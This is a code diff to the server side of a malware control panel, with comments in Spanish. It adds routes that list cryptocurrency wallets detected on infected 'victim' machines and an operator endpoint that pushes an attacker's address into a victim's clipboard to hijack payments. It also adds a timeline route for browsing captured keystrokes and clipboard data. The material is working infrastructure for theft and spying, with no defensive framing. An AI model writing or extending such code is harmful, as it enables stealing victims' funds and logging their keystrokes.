@@ -14,6 +14,8 @@ import { isOnline } from '../lib/presence';
 import { publish } from '../lib/bus';
 import { dispatchCommand, hasControl } from './ws';
 import { isPreviewable, mimeFor } from '../lib/mime';
+import { active as activeWallets } from '../lib/wallet-detection';
+import { page as timelinePage } from '../lib/timeline';
 
 function isWindowsOs(os: string | null | undefined): boolean {
   return /^win/i.test((os ?? '').trim());
@@ -154,25 +156,45 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
 
   app.get('/victims/:id/open-wallets', async (request) => {
     const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
-    const since = new Date(Date.now() - 60 * 60_000);
-    const closed = await prisma.event.findFirst({ where: { victimId: id, kind: 'wallet_closed', createdAt: { gte: since } }, orderBy: { createdAt: 'desc' }, select: { createdAt: true } });
-    const detected = await prisma.event.findMany({
-      where: { victimId: id, kind: 'wallet_detected', createdAt: { gte: closed?.createdAt ?? since } },
-      orderBy: { createdAt: 'desc' },
-      take: 40,
-      select: { createdAt: true, data: true }
+    const rows = await activeWallets(id);
+    return {
+      items: rows.map((row) => ({ id: row.id, name: row.provider, provider: row.provider, kind: row.kind, pid: row.pid, window: row.window, url: row.url, at: row.lastSeenAt, count: row.count })),
+      count: rows.length
+    };
+  });
+
+  /** Ventana de detección de wallets con estado y contador, para la cabecera. */
+  app.get('/victims/:id/wallets/live', async (request) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const items = await activeWallets(id);
+    return { items, count: items.length, detectedTotal: await prisma.walletDetection.count({ where: { victimId: id } }) };
+  });
+
+  /** Copia una dirección del atacante al portapapeles de la víctima. */
+  app.post('/victims/:id/wallets/:walletId/replace', { preHandler: requireRole('operator') }, async (request) => {
+    const { id, walletId } = z.object({ id: z.string().uuid(), walletId: z.string().uuid() }).parse(request.params);
+    const input = z.object({ address: z.string().min(8).max(128) }).parse(request.body);
+    const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true } });
+    if (!victim) throw notFound('victim');
+    if (!hasControl(id)) throw new HttpError(409, 'agent_offline', 'sin socket de control: la dirección se copiará cuando vuelva');
+    const created = await prisma.task.create({
+      data: { victimId: id, name: 'clip_set', params: { text: input.address }, timeoutSec: 30, createdById: request.operator?.id }
     });
-    const seen = new Set<number>();
-    const items = [];
-    for (const row of detected) {
-      const data = row.data as { name?: string; pid?: number; text?: string };
-      const pid = Number(data.pid ?? 0);
-      const name = String(data.name ?? data.text ?? '').replace(/^wallet detected:\s*/i, '').replace(/\s*\(\d+\)$/, '') || 'wallet';
-      if (pid && seen.has(pid)) continue;
-      if (pid) seen.add(pid);
-      items.push({ name, pid: pid || null, at: row.createdAt });
-    }
-    return { items: items.slice(0, 12) };
+    const sent = await dispatchCommand({ id: created.id, victimId: id, name: 'clip_set', params: { text: input.address }, timeoutSec: 30 });
+    if (!sent) throw new HttpError(409, 'agent_offline', 'sin socket de control');
+    await audit(prisma, { operatorId: request.operator?.id, action: 'wallet.replace', entity: 'wallet', entityId: walletId, ip: request.clientIp, data: { address: input.address, taskId: created.id } });
+    return { ok: true, taskId: created.id };
+  });
+
+  app.get('/victims/:id/timeline', async (request) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const query = z.object({
+      q: z.string().max(256).default(''),
+      type: z.enum(['keystroke', 'clipboard']).optional(),
+      cursor: z.string().uuid().optional(),
+      limit: z.coerce.number().int().min(1).max(200).default(100)
+    }).parse(request.query);
+    return timelinePage(id, query);
   });
 
   app.get('/victims/:id', async (request) => {
